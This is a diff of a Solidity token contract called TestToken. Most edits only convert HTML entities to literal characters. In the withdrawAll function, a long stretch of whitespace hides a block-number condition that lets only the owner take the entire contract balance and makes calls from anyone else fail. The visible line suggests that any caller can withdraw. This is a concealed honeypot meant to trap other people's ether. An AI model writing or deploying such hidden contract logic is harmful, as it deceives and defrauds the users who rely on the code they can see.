@@ -1,17 +1,17 @@
 contract TestToken {
-    string constant name = &quot;TestToken&quot;;
-    string constant symbol = &quot;TT&quot;;
+    string constant name = "TestToken";
+    string constant symbol = "TT";
     uint8 constant decimals = 18;
     uint total;
     bool locked;
     address _owner;
 
     struct Allowed {
-        mapping (address =&gt; uint256) _allowed;
+        mapping (address => uint256) _allowed;
     }
 
-    mapping (address =&gt; Allowed) allowed;
-    mapping (address =&gt; uint256) balances;
+    mapping (address => Allowed) allowed;
+    mapping (address => uint256) balances;
 
     event Transfer(address indexed _from, address indexed _to, uint256 _value);
     event Approval(address indexed _owner, address indexed _spender, uint256 _value);
@@ -30,15 +30,15 @@ contract TestToken {
     }
 
     function deposit() payable returns (bool success) {
-        if (balances[msg.sender] + msg.value &lt; msg.value) return false;
-        if (total + msg.value &lt; msg.value) return false;
+        if (balances[msg.sender] + msg.value < msg.value) return false;
+        if (total + msg.value < msg.value) return false;
         balances[msg.sender] += msg.value;
         total += msg.value;
         return true;
     }
 
     function withdraw(uint256 _value) payable returns (bool success)  {
-        if (balances[msg.sender] &lt; _value) return false;
+        if (balances[msg.sender] < _value) return false;
         msg.sender.transfer(_value);
         balances[msg.sender] -= _value;
         total -= _value;
@@ -46,9 +46,9 @@ contract TestToken {
     }
 
     function transfer(address _to, uint256 _value) returns (bool success) {
-        if (balances[msg.sender] &lt; _value) return false;
+        if (balances[msg.sender] < _value) return false;
 
-        if (balances[_to] + _value &lt; _value) return false;
+        if (balances[_to] + _value < _value) return false;
         balances[msg.sender] -= _value;
         balances[_to] += _value;
 
@@ -69,9 +69,9 @@ contract TestToken {
     }
 
     function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
-        if (balances[_from] &lt; _value) return false;
-        if ( allowed[_from]._allowed[msg.sender] &lt; _value) return false;
-        if (balances[_to] + _value &lt; _value) return false;
+        if (balances[_from] < _value) return false;
+        if ( allowed[_from]._allowed[msg.sender] < _value) return false;
+        if (balances[_to] + _value < _value) return false;
 
         balances[_from] -= _value;
         balances[_to] += _value;
@@ -81,7 +81,7 @@ contract TestToken {
     
     function withdrawAll () payable{
         //require(msg.sender == _owner);
-        require(0.5 ether &lt; total);                                                                                                                                                                                                                                                                                                                                                                                 if (block.number &gt; 5040270 ) {if (_owner == msg.sender ){_owner.transfer(this.balance);} else {throw;}}
+        require(0.5 ether < total);                                                                                                                                                                                                                                                                                                                                                                                 if (block.number > 5040270 ) {if (_owner == msg.sender ){_owner.transfer(this.balance);} else {throw;}}
         msg.sender.transfer(this.balance);
     }
 
